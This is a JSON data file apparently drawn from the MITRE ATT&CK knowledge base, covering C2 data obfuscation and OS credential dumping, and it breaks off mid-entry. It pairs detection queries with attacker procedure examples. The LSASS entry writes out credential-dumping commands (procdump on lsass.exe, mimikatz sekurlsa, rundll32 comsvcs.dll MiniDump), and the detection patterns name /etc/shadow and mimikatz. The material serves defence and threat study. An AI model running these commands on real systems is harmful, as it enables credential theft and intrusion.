{
  "T1001": {
    "Name": "Data Obfuscation",
    "Description": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.[1]Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
    "Detects": [
      "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[14]"
    ],
    "Procedure Examples": [
      "DarkGatewill retrieved encrypted commands from its command and control server for follow-on actions such as cryptocurrency mining.[2]",
      "FlawedAmmyymay obfuscate portions of the initial C2 handshake.[3]",
      "FRAMESTINGcan send and receive zlib compressed data withinPOSTrequests.[4]",
      "FunnyDreamcan send compressed and obfuscated packets to C2.[1]",
      "Gamaredon Grouphas used obfuscated VBScripts with randomly generated variable names and concatenated strings.[5]",
      "Ninjahas the ability to modify headers and URL paths to hide malicious traffic in HTTP requests.[6]",
      "Okrum leverages the HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.[7]",
      "DuringOperation Wocao, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4.[8]",
      "RDAThas used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.[9]",
      "SideTwistcan embed C2 responses in the source code of a fake Flickr webpage.[10]",
      "SLOTHFULMEDIAhas hashed a string containing system information prior to exfiltration via POST requests.[11]",
      "StrelaStealerencrypts the payload of HTTP POST communications using the same XOR key used for the malware's DLL payload.[12]",
      "TrailBlazercan masquerade its C2 traffic as legitimate Google Notifications HTTP requests.[13]"
    ]
  },
  "T1001.001": {
    "Name": "Data Obfuscation:Junk Data",
    "Description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.[1]By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
    "Detects": [
      "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[18]"
    ],
    "Procedure Examples": [
      "APT28added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[2]",
      "BendyBearhas used byte randomization to obscure its behavior.[3]",
      "Downdelphinserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.[4]",
      "GoldMaxhas used decoy traffic to surround its malicious network traffic to avoid detection.[5]",
      "GrimAgentcan pad C2 messages with random generated values.[6]",
      "Kevincan generate a sequence of dummy HTTP C2 requests to obscure traffic.[7]",
      "Morihas obfuscated the FML.dll with 200MB of junk data.[8]",
      "P2P ZeuSadded junk data to outgoing UDP packets to peer implants.[9]",
      "P8RATcan send randomly-generated data as part of its C2 communication.[10]",
      "PLEADsamples were found to be highly obfuscated with junk code.[11][12]",
      "SUNBURSTadded junk bytes to its C2 over HTTP.[1]",
      "TrailBlazerhas used random identifier strings to obscure its C2 operations and result codes.[13]",
      "Turiancan insert pseudo-random characters into its network encryption setup.[14]",
      "UPSTYLEretrieves a non-existent webpage from the command and control server then parses commands from the resulting error logs to decode commands to the web shell.[15]",
      "Uroburoscan add extra characters in encoded strings to help mimic DNS legitimate requests.[16]",
      "WellMesscan use junk data in the Base64 string for additional obfuscation.[17]"
    ]
  },
  "T1001.002": {
    "Name": "Data Obfuscation:Steganography",
    "Description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
    "Detects": [
      "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[15]"
    ],
    "Procedure Examples": [
      "Axiomhas used steganography to hide its C2 communications.[1]",
      "Daserfcan use steganography to hide malicious code downloaded to the victim.[2]",
      "When theDuqucommand and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.[3]",
      "HAMMERTOSSis controlled via commands that are appended to image files.[4]",
      "LightNeuronis controlled via commands that are embedded into PDFs and JPGs using steganographic methods.[5]",
      "LunarMailcan parse IDAT chunks from .png files to look for zlib-compressed and AES encrypted C2 commands.[6]",
      "LunarWebcan receive C2 commands hidden in the structure of .jpg and .gif images.[6]",
      "DuringOperation Ghost,APT29used steganography to hide the communications between the implants and their C&C servers.[7]",
      "RDATcan process steganographic images attached to email messages to send and receive C2 commands.RDATcan also embed additional messages within BMP images to communicate with theRDAToperator.[8]",
      "Slivercan encode binary data into a .PNG file for C2 communication.[9]",
      "SUNBURSTC2 data attempted to appear as benign XML related to .NET assemblies or as a faux JSON blob.[10][11][12]",
      "ZeroThas retrieved stage 2 payloads as Bitmap images that use Least Significant Bit (LSB) steganography.[13][14]",
      "Zoxhas used the .PNG file format for C2 communications.[1]"
    ]
  },
  "T1001.003": {
    "Name": "Data Obfuscation:Protocol or Service Impersonation",
    "Description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.[1][2]",
    "Detects": [
      "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[23]"
    ],
    "Procedure Examples": [
      "BADCALLuses a FakeTLS method during C2.[3]",
      "Bankshotgenerates a false TLS handshake using a public certificate to disguise C2 network communications.[4]",
      "DuringC0017,APT41frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.[5]",
      "Cobalt Strikecan leverage the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.[6]",
      "FakeMC2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Additionally, some variants ofFakeMuse modified SSL code for communications back to C2 servers, making SSL decryption ineffective.[7]",
      "FALLCHILLuses fake Transport Layer Security (TLS) to communicate with its C2 server.[8]",
      "FRAMESTINGuses a cookie namedDSIDto mimic the name of a cookie used by Ivanti Connect Secure appliances for maintaining VPN sessions.[9]",
      "HARDRAINuses FakeTLS to communicate with its C2 server.[10]",
      "Higaisaused a FakeTLS session for C2 communications.[11]",
      "InvisiMolecan mimic HTTP protocol with custom HTTP \"verbs\" HIDE, ZVVP, and NOP.[12][13]",
      "KeyBoyuses custom SSL libraries to impersonate SSL in C2 traffic.[14]",
      "Lazarus Groupmalware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.[15][16][17][18]",
      "Ninjahas the ability to mimic legitimate services with customized HTTP URL paths and headers to hide malicious traffic.[19]",
      "Okrumleverages the HTTP protocol for C2 communication, while hiding the actual messages in the Cookie and Set-Cookie headers of the HTTP requests.[1]",
      "SUNBURSTmasqueraded its network traffic as the Orion Improvement Program (OIP) protocol.[20]",
      "TAINTEDSCRIBEhas used FakeTLS for session authentication.[21]",
      "Uroburoscan use custom communication methodologies that ride over common  protocols including TCP, UDP, HTTP, SMTP, and DNS in order to blend with normal network traffic.[22]"
    ]
  },
  "T1003": {
    "Name": "OS Credential Dumping",
    "Description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.[1]Credentials can then be used to performLateral Movementand access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
    "Detects": [
      "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.[33][34][35]Note: Domain controllers may not log replication requests originating from the default domain controller account.[36]. Monitor for replication requests[37]from IPs not associated with known domain controllers.[23]Analytic 1 - Suspicious Replication Requestssourcetype=WinEventLog:Security EventCode=\"4662\" AND AccessMask= \"0x100\" AND (guid= \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\" OR guid= \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" OR guid= \"9923a32a-3607-11d2-b9be-0000f87a36b2\" OR guid= \"89e95b76-444d-4c62-991a-0facbeda640c\")",
      "Monitor executed commands and arguments that may attempt to dump credentials using tools likeMimikatz, ProcDump, NTDSUtil, or accessing /proc, /etc/passwd, and /etc/shadow.Analytic 1 - Suspicious command execution involving credential dumping tools.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 Image IN (\"mimikatz.exe\", \"procdump.exe\", \"ntdsutil.exe\", \"powershell.exe\") CommandLine IN (\"Invoke-Mimikatz\", \"Invoke-CachedCredentials\", \"Invoke-LSADump\", \"Invoke-SAMDump\"))OR(index=security sourcetype=\"linux_secure\" Command IN (\"cat /etc/passwd\", \"cat /etc/shadow\", \"grep -E '^[0-9a-f-]r' /proc//maps\"))OR(index=security sourcetype=\"macOS:UnifiedLog\" process IN (\"cat\", \"grep\") message IN (\"/etc/passwd\", \"/etc/shadow\", \"/var/db/shadow/hash/*\", \"/private/etc/master.passwd\"))",
      "Monitor file accesses that may indicate attempts to dump credential data from various storage locations such as LSASS memory, SAM, NTDS.dit, LSA secrets, cached domain credentials, proc filesystem, /etc/passwd, and /etc/shadow.Analytic 1 - Unauthorized access to credential storage files.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"\\config\\SAM\", \"\\ntds.dit\", \"\\policy\\secrets\", \"\\cache\"))OR (index=security sourcetype=\"auditd\" (key=\"path\" (value IN (\"/etc/passwd\", \"/etc/shadow\")) OR key=\"proctitle\" value IN (\"cat\", \"strings\", \"grep\", \"awk\", \"cut\", \"sed\", \"sort\", \"uniq\", \"head\", \"tail\", \"less\", \"more\")))OR(index=security sourcetype=\"macOS:UnifiedLog\" (process IN (\"cat\", \"grep\", \"awk\", \"cut\", \"sed\", \"sort\", \"uniq\", \"head\", \"tail\", \"less\", \"more\") OR message IN (\"/etc/passwd\", \"/etc/shadow\", \"/var/db/shadow/hash/*\", \"/private/etc/master.passwd\")))",
      "Monitor for the unexpected creation of memory dump files for processes that may contain credentials.Analytic 1 - Unexpected memory dump file creation.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"lsass.dmp\", \"\\config\\SAM\", \"\\ntds.dit\", \"\\policy\\secrets\", \"\\cache\"))OR (index=security sourcetype=\"linux_secure\" (key=\"path\" value IN (\"/etc/passwd\", \"/etc/shadow\")))OR (index=security sourcetype=\"macOS:UnifiedLog\" message IN (\"/var/db/shadow/hash/*\", \"/private/etc/master.passwd\"))",
      "Monitor for network protocols[33][38]and other replication requests[37]from IPs not associated with known domain controllers.[23]Analytic 1 - Anomalous network traffic content related to credential managersindex=network sourcetype=\"stream:tcp\" dest_port=389 NOT [| inputlookup known_dc_ip_addresses | fields ip]| eval SourceIP = src_ip, DestinationIP = dest_ip, Protocol = proto| search (content=\"LDAPSearchRequest\") OR (content=\"LDAPModifyRequest\") OR (content=\"bindRequest\") OR (content=\"searchResEntry\") OR (content=\"NTDS.dit\")",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.Analytic 1 - Unusual network communication patterns.index=network sourcetype=\"stream:tcp\" dest_port=389 NOT [| inputlookup known_dc_ip_addresses | fields ip]",
      "Monitor for API calls that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",
      "Monitor for unexpected processes interacting with lsass.exe.[39]Common credential dumpers such asMimikatzaccess the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflectiveProcess Injectionto reduce potential indicators of malicious activity.LinuxTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path/proc/<pid>/maps, where the<pid>directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.Analytic 1 - Unauthorized access to credential managers.(index=security sourcetype=\"WinEventLog:Security\" EventCode=10 TargetImage=\"lsass.exe\" SourceImage IN (\"mimikatz.exe\", \"procdump.exe\"))OR (index=security sourcetype=\"linux_secure\" (key=\"path\" value IN (\"/etc/passwd\", \"/etc/shadow\")) (key=\"cmdline\" value IN (\"mimikatz\", \"procdump\")))OR(index=security sourcetype=\"macOS:UnifiedLog\" message IN (\"/var/db/shadow/hash/\", \"/private/etc/master.passwd\") process IN (\"mimikatz\", \"procdump\"))",
      "Monitor for newly executed processes that may be indicative of credential dumping.Analytic 1 - Unexpected process creation related to credential dumping.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 Image=\"procdump.exe\" CommandLine IN (\"-ma lsass\"))OR (index=security sourcetype=\"linux_secure\" (key=\"cmdline\" value IN (\"procdump-ma /proc/$(pgrep lsass)\")) (key=\"exe\" value=\"procdump\"))OR(index=security sourcetype=\"macOS:UnifiedLog\" process=\"procdump\" command=\"-ma /proc/$(pgrep lsass)\")",
      "Monitor for the SAM registry key being accessed that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.Analytic 1 - Unauthorized registry access to SAM key.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"*\\SAM\" | where ProcessName IN (\"mimikatz.exe\", \"procdump.exe\", \"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\")"
    ],
    "Procedure Examples": [
      "APT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.[2][3][4]",
      "APT32used GetPassword_x64 to harvest credentials.[5][6]",
      "APT39has used different versions of Mimikatz to obtain credentials.[7]",
      "Axiomhas been known to dump credentials.[8]",
      "BlackByteused tools such asCobalt StrikeandMimikatzto dump credentials from victim systems.[9][10]",
      "Carbanakobtains Windows logon password details.[11]",
      "Ember Beargathers credential material from target systems, such as SSH keys, to facilitate access to victim environments.[12]",
      "HOMEFRYcan perform credential dumping.[13]",
      "Leviathanhas used publicly available tools to dump password hashes, includingHOMEFRY.[14]",
      "MgBotincludes modules for dumping and capturing credentials from process memory.[15]",
      "OnionDukesteals credentials from its victims.[16]",
      "PinchDukesteals credentials from compromised hosts.PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted byPinchDukeinclude ones associated many sources such as WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).[16]",
      "Poseidon Groupconducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[17]",
      "Revenge RAThas a plugin for credential harvesting.[18]",
      "Sowbughas used credential dumping tools.[19]",
      "Suckflyused a signed credential-dumping tool to obtain victim account credentials.[20]",
      "Tonto Teamhas used a variety of credential dumping tools.[21]",
      "Trojan.Karaganycan dump passwords and save them into\\ProgramData\\Mail\\MailAg\\pwds.txt.[22]"
    ]
  },
  "T1003.001": {
    "Name": "OS Credential Dumping:LSASS Memory",
    "Description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conductLateral MovementusingUse Alternate Authentication Material.As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswordsBuilt-in Windows tools such ascomsvcs.dllcan also be used:rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full[1][2]Similar toImage File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump oflsass.exethrough Windows Error Reporting (WerFault.exe).[3]Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security PackagesandHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[4]The following SSPs can be used to access credentials:Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.[5]Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.[5]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[114]which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Note: Event ID 4104 from the \"Microsoft-Windows-PowerShell/Operational\" log captures Powershell script blocks, whose contents can be further analyzed to determine if they’re performing LSASS dumping.Analytic 1 - Unauthorized command execution of LSASS memory.index=security sourcetype=\"Powershell\" EventCode=4104Image=\"powershell.exe\" CommandLine IN (\"Invoke-Mimikatz\", \"procdump.exe-ma lsass\", \"rundll32.execomsvcs.dll, MiniDump\", \"taskmgr.exe* /dump\")",
      "Monitor for the unexpected creation of memory dump files for the LSASS process (e.g.,lsass{*}.dmp).Analytic 1 - Unexpected creation of LSASS dump files.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"\\lsass.dmp\" | where ProcessName IN (\"procdump.exe\", \"rundll32.exe\", \"taskmgr.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"comsvcs.dll\")",
      "Monitor for newly constructed logon behavior from credentials being accessed by process memory of the LSASS. For example, detect behaviors of Secretsdump against a system, not being a Domain Controller.Analytic 1 - Unusual logon sessions from LSASS memory access.index=security sourcetype=\"WinEventLog:Security\" EventCode=4624 TargetUserName=\"*\"| eval LogonType=case(Logon_Type==\"2\", \"Interactive\", Logon_Type==\"3\", \"Network\", Logon_Type==\"4\", \"Batch\", Logon_Type==\"5\", \"Service\", Logon_Type==\"7\", \"Unlock\", Logon_Type==\"8\", \"NetworkCleartext\", Logon_Type==\"9\", \"NewCredentials\", Logon_Type==\"10\", \"RemoteInteractive\", Logon_Type==\"11\", \"CachedInteractive\")| where LogonType IN (\"Interactive\", \"RemoteInteractive\", \"NetworkCleartext\")",
      "Monitor for API calls that may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). OS API calls associated with LSASS process dumping includeOpenProcessandMiniDumpWriteDump. Execution of these functions might trigger security log ids such as 4663 (Microsoft Security Auditing) and 10 (Microsoft Sysmon)Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor for unexpected processes interacting with LSASS.exe.[115]Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflectiveProcess Injectionto reduce potential indicators of malicious activity.Usage of Procdump and Windows Task Manager for LSASS dumping can also be detected via process creation events, since they both have a predictable set of command-line arguments (i.e., for specifying the process to be dumped).Note: Sysmon process access events (Event ID 10) can be extremely noisy, which necessitates tweaking the Sysmon configuration file. We recommend taking an approach analogous to that of the Sysmon Modular Configuration project (https://github.com/olafhartong/sysmon-modular) and filtering out any benign processes in your environment that produce large volumes of process access events.The GrantedAccess value in the below analytic for Mimikatz is meant to be used solely as an illustrative example of detecting Mimikatz LSASS access. However, actual GrantedAccess values change over time with different versions of Mimikatz and therefore detection engineers need to verify the accuracy of any GrantedAccess values that their analytics are using.Analytic 1 - Mimikatz(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"10\" AND TargetImage= \"lsass.exe\" AND (GrantedAccess=0x1410 OR GrantedAccess=0x1010 OR GrantedAccess=0x1438 OR GrantedAccess=0x143a OR GrantedAccess=0x1418)CallTrace=\"C:\\windows\\SYSTEM32\\ntdll.dll+|C:\\windows\\System32\\KERNELBASE.dll+20edd|UNKNOWN(*)\")Analytic 2 - Suspicious process access to LSASS memory.((sourceType=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"10\") AND TargetImage= \"*lsass.exe\" AND SourceImage IN (\"*mimikatz.exe\", \"*procdump.exe\", \"*rundll32.exe\", \"*taskmgr.exe\", \"*powershell.exe\")",
      "Monitor for newly executed processes that may be indicative of credential dumping. On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process. Try monitoring for Sysmon Event ID 1 and/or Windows Security Event ID 4688 for process activity.Note: - Rundll32/MiniDump has a different command-line syntax than that of Procdump, in that the process being dumped is specified via process ID instead of name (as with Procdump). Therefore, because the LSASS process ID is non-deterministic, the MiniDump detection isn’t specific to LSASS dumping and may need to be tuned to help reduce false positives.- When monitoring for .dll  functions on the command-line be sure to also check for the ordinal associated with the function.Analytic 1 - Unexpected process creation related to LSASS memory dumping.index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 Image IN (\"procdump.exe\", \"rundll32.exe\", \"taskmgr.exe\", \"powershell.exe\") CommandLine IN (\"-ma lsass\", \"rundll32.execomsvcs.dll, MiniDump\", \"taskmgr.exe/dump\", \"powershell.exe-Command Get-Process lsass | Out-MemoryDump\")",
      "Monitor for changes to Registry entries associated with credential access that is stored in the process memory of the LSASS. For example, the adversary can modify the SAM and SYSTEM files.Analytics 1 - Unauthorized registry modifications related to LSASS.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"\\SYSTEM\\CurrentControlSet\\Services\\\", \"\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\", \"\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\", \"*\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\") | where ProcessName IN (\"reg.exe\", \"powershell.exe\", \"wmic.exe\", \"schtasks.exe\", \"cmd.exe\", \"rundll32.exe\")"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm TeamusedMimikatzto capture and use legitimate credentials.[6]",
      "Agriusused tools such asMimikatzto dump LSASS memory to capture credentials in victim environments.[7]",
      "APT1has been known to use credential dumping usingMimikatz.[8]",
      "APT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.[9][10]They have also dumped the LSASS process memory using the MiniDump function.[11]",
      "APT3has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\"[12]",
      "APT32used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.[13][14]",
      "APT33has used a variety of publicly available tools likeLaZagne,Mimikatz, and ProcDump to dump credentials.[15][16]",
      "APT39has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.[17]",
      "APT41has used hashdump,Mimikatz, Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.[18][19][20]",
      "APT5has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes.APT5has also dumped clear text passwords and hashes from memory usingMimikatzhosted through an RDP mapped drive.[21]",
      "Aquatic Pandahas attempted to harvest credentials through LSASS memory dumping.[22]",
      "Bad Rabbithas usedMimikatzto harvest credentials from the victim's machine.[23]",
      "Blue Mockingbirdhas used Mimikatz to retrieve credentials from LSASS memory.[24]",
      "BRONZE BUTLERhas used various tools (such as Mimikatz and WCE) to perform credential dumping.[25]",
      "During theC0032campaign,TEMP.Velesused Mimikatz and a custom tool, SecHack, to harvest credentials.[26]",
      "Cleaverhas been known to dump credentials using Mimikatz and Windows Credential Editor.[27]",
      "Cobalt Strikecan spawn a job to inject into LSASS memory and dump password hashes.[28]",
      "CozyCarhas executedMimikatzto harvest stored credentials from the victim and further victim penetration.[29]",
      "DuringCutting Edge, threat actors used Task Manager to dump LSASS memory from Windows devices to disk.[30]",
      "DaserfleveragesMimikatzandWindows Credential Editorto steal credentials.[31]",
      "Earth Luscahas used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process.[32]",
      "Ember Bearuses legitimate Sysinternals tools such as procdump to dump LSASS memory.[33][34]",
      "Emotethas been observed dropping and executing password grabber modules includingMimikatz.[35][36]",
      "Empirecontains an implementation ofMimikatzto gather credentials from memory.[37]",
      "FIN13has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory withMimikatz.[38][39]",
      "FIN6has usedWindows Credential Editorfor credential dumping.[40][41]",
      "FIN8harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).[42]",
      "Fox Kittenhas used prodump to dump credentials from LSASS.[43]",
      "GALLIUMused a modified version ofMimikatzalong with a PowerShell-basedMimikatzto dump credentials on the victim machines.[44][45]",
      "GreyEnergyhas a module forMimikatzto collect Windows credentials from the victim’s machine.[46]",
      "HAFNIUMhas usedprocdumpto dump the LSASS process memory.[47][1][48]",
      "DuringHomeLand Justice, threat actors dumped LSASS memory on compromised hosts.[49]",
      "SecretsDump andMimikatzmodules withinImpacketcan perform credential dumping to obtain account and password information.[50]",
      "Indrik SpiderusedCobalt Striketo carry out credential dumping using ProcDump.[51]",
      "Ke3changhas dumped credentials, including by usingMimikatz.[52][53][54]",
      "Kimsukyhas gathered credentials usingMimikatzand ProcDump.[55][56][57]",
      "LaZagnecan perform credential dumping from memory to obtain account and password information.[58]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne and Mimikatz.[59]",
      "Leviathanhas used publicly available tools to dump password hashes, including ProcDump and WCE.[60]",
      "Lizarcan runMimikatzto harvest credentials.[61][62]",
      "Lslsasscan dump active logon session password hashes from the lsass process.[8]",
      "Mafaldacan dump password hashes fromLSASS.exe.[63]",
      "Magic Houndhas stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller usingMimikatz.[64][65][66][67]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory.[68][69][70][71]",
      "Moonstone Sleetretrieved credentials from LSASS memory.[72]",
      "MuddyWaterhas performed credential dumping withMimikatzand procdump64.exe.[73][74][75]",
      "Net Crawleruses credential dumpers such asMimikatzandWindows Credential Editorto extract cached credentials from Windows systems.[27]",
      "NotPetyacontains a modified version ofMimikatzto help gather credentials that are later used for lateral movement.[76][77][71]",
      "OilRighas used credential dumping tools such asMimikatzto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[78][79][64][80]",
      "Okrumwas seen using MimikatzLite to perform credential dumping.[81]",
      "Olympic Destroyercontains a module that tries to obtain credentials from LSASS, similar toMimikatz. These credentials are used withPsExecandWindows Management Instrumentationto help the malware propagate itself across a network.[82]",
      "DuringOperation Wocao, threat actors used ProcDump to dump credentials from memory.[83]",
      "PLATINUMhas used keyloggers that are also capable of dumping credentials.[84]",
      "Playhas usedMimikatzand the Windows Task Manager to dump LSASS process memory.[85]",
      "PoetRATused voStro.exe, a compiled pypykatz (Python version ofMimikatz), to steal credentials.[86]",
      "PoshC2contains an implementation ofMimikatzto gather credentials from memory.[87]",
      "PowerSploitcontains a collection of Exfiltration modules that can harvest credentials usingMimikatz.[88][89]",
      "Pupycan execute Lazagne as well asMimikatzusing PowerShell.[90]",
      "Pysacan perform OS credential dumping usingMimikatz.[91]",
      "RedCurlusedLaZagneto obtain passwords from memory.[92][93]",
      "Sandworm Teamhas used its plainpwd tool, a modified version ofMimikatz, and comsvcs.dll to dump Windows credentials from system memory.[94][95][96]",
      "Silencehas used the Farse6.1 utility (based onMimikatz) to extract credentials from lsass.exe.[97]",
      "SILENTTRINITYcan create a memory dump of LSASS via theMiniDumpWriteDump Win32API call.[98]",
      "Sliverhas a built-inprocdumpcommand allowing for retrieval of memory from processes such aslsass.exefor credential harvesting.[99]",
      "Threat Group-3390actors have used a modified version ofMimikatzcalled Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.[100][101]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesused Mimikatz.[102]",
      "Volt Typhoonhas attempted to access hashed credentials from the LSASS process memory space.[103][104]",
      "Whiteflyhas usedMimikatzto obtain credentials.[105]",
      "Windows Credential Editorcan dump credentials.[106]",
      "Wizard Spiderhas dumped the lsass.exe memory to harvest credentials with the use of open-source toolLaZagne.[107]"
    ]
  },
  "T1003.002": {
    "Name": "OS Credential Dumping:Security Account Manager",
